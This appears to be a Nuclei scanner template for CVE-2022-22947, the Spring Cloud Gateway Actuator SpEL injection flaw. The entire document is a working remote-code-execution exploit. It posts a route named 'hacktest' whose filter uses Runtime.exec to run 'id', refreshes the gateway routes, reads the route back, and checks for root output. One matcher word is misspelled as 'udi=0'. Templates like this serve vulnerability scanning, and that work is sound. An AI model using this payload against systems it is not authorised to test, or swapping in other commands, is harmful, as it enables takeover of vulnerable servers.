id: CVE-2022-22947

info:
  name: CVE-2022-22947
  author: Mammad Rahimzada
  severity: critical
  description: Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)
  reference:
    - https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947
  tags: cve,cve2022,rce,spring

requests:
  - method: POST
    path: /actuator/gateway/routes/hacktest
    headers:
      Host: {{Hostname}}
      Accept-Encoding: gzip, deflate
      Accept: */*
      Accept-Language: en
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
      Connection: close
      Content-Type: application/json
      Content-Length: 329
    body:
      |
        {
          "id": "hacktest",
          "filters": [{
            "name": "AddResponseHeader",
            "args": {
              "name": "Result",
              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
            }
          }],
          "uri": "http://example.com"
        }

  - method: POST
    path: /actuator/gateway/refresh
    headers:
      Host: {{Hostname}}
      Accept-Encoding: gzip, deflate
      Accept: */*
      Accept-Language: en
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
      Connection: close
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 0

  - method: GET
    path: /actuator/gateway/routes/hacktest
    headers:
      Host: {{Hostname}}
      Accept-Encoding: gzip, deflate
      Accept: */*
      Accept-Language: en
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
      Connection: close
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 0

matchers-condition: and
matchers:
  - type: word
    part: body
    words:
      - "udi=0"
      - "(root)"
      - "groups"
      - "hacktest"
